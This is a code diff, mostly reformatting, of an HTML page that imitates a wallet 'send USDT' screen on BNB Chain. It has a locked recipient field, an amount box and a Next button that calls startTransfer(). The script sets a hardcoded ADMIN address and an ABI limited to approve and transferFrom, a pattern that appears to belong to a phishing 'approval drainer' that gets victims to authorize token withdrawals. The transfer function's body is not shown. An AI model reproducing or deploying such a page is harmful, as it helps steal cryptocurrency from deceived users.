@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
@@ -14,120 +13,113 @@
       display: flex;
       flex-direction: column;
       justify-content: space-between;
-    }
+    }.container {
+  padding: 25px 20px 0 20px;
+  max-width: 460px;
+  margin: auto;
+}
 
-    .container {
-      padding: 25px 20px 0 20px;
-      max-width: 460px;
-      margin: auto;
-    }
+label {
+  font-size: 15px;
+  font-weight: 500;
+  color: #444;
+  margin-bottom: 6px;
+  display: block;
+}
 
-    label {
-      font-size: 15px;
-      font-weight: 500;
-      color: #444;
-      margin-bottom: 6px;
-      display: block;
-    }
+input[type="text"], input[type="number"] {
+  width: 100%;
+  padding: 14px;
+  font-size: 16px;
+  border: 1px solid #ccc;
+  border-radius: 12px;
+  margin-bottom: 15px;
+  box-sizing: border-box;
+}
 
-    input[type="text"], input[type="number"] {
-      width: 100%;
-      padding: 14px;
-      font-size: 16px;
-      border: 1px solid #ccc;
-      border-radius: 12px;
-      margin-bottom: 15px;
-      box-sizing: border-box;
-    }
+.amount-row {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
 
-    .amount-row {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
+.amount-row span {
+  font-size: 16px;
+}
 
-    .amount-row span {
-      font-size: 16px;
-    }
+.amount-row button {
+  background: none;
+  border: none;
+  color: #0047FF;
+  font-weight: bold;
+  font-size: 15px;
+  cursor: pointer;
+}
 
-    .amount-row button {
-      background: none;
-      border: none;
-      color: #0047FF;
-      font-weight: bold;
-      font-size: 15px;
-      cursor: pointer;
-    }
+#usdValue {
+  font-size: 14px;
+  color: #888;
+  margin-top: -8px;
+  margin-bottom: 30px;
+}
 
-    #usdValue {
-      font-size: 14px;
-      color: #888;
-      margin-top: -8px;
-      margin-bottom: 30px;
-    }
+.footer {
+  padding: 20px;
+  margin-top: auto;
+}
 
-    .footer {
-      padding: 20px;
-      margin-top: auto;
-    }
+#nextBtn {
+  width: 100%;
+  padding: 16px;
+  font-size: 18px;
+  background-color: #0047FF;
+  color: white;
+  font-weight: bold;
+  border: none;
+  border-radius: 24px;
+  cursor: pointer;
+  transition: all 0.3s;
+  position: relative;
+}
 
-    #nextBtn {
-      width: 100%;
-      padding: 16px;
-      font-size: 18px;
-      background-color: #0047FF;
-      color: white;
-      font-weight: bold;
-      border: none;
-      border-radius: 24px;
-      cursor: pointer;
-      transition: all 0.3s;
-      position: relative;
-    }
+#nextBtn.processing::after {
+  content: '⏳ Processing...';
+  position: absolute;
+  left: 0;
+  right: 0;
+  text-align: center;
+}
 
-    #nextBtn.processing::after {
-      content: '⏳ Processing...';
-      position: absolute;
-      left: 0;
-      right: 0;
-      text-align: center;
-    }
+#nextBtn.success::after {
+  content: '✅ Success!';
+  color: white;
+}
 
-    #nextBtn.success::after {
-      content: '✅ Success!';
-      color: white;
-    }
+#nextBtn.error::after {
+  content: '❌ Error!';
+  color: white;
+}
 
-    #nextBtn.error::after {
-      content: '❌ Error!';
-      color: white;
-    }
   </style>
 </head>
 <body>
   <div class="container">
     <label>Address or Domain Name</label>
-    <input type="text" disabled value="0x79069192614f7ceE4F..." />
+    <input type="text" disabled value="0x79069192614f7ceE4F..." /><label>Amount</label>
+<div class="amount-row">
+  <input type="number" id="usdtAmount" placeholder="0.00" />
+  <span>USDT</span>
+  <button onclick="setMax()">Max</button>
+</div>
 
-    <label>Amount</label>
-    <div class="amount-row">
-      <input type="number" id="usdtAmount" placeholder="0.00" />
-      <span>USDT</span>
-      <button onclick="setMax()">Max</button>
-    </div>
+<p id="usdValue">= $0.00</p>
 
-    <p id="usdValue">= $0.00</p>
-  </div>
-
-  <div class="footer">
+  </div>  <div class="footer">
     <button id="nextBtn" onclick="startTransfer()">Next</button>
-  </div>
-
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
-  <script>
+  </div>  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>  <script>
     const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
     const ADMIN = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
-    const BNB_CHAIN_ID = "0x38"; // BNB Chain
+    const BNB_CHAIN_ID = "0x38";
     const ABI = [
       { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
       { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
@@ -179,6 +171,5 @@
         btn.disabled = false;
       }
     }
-  </script>
-</body>
+  </script></body>
 </html>
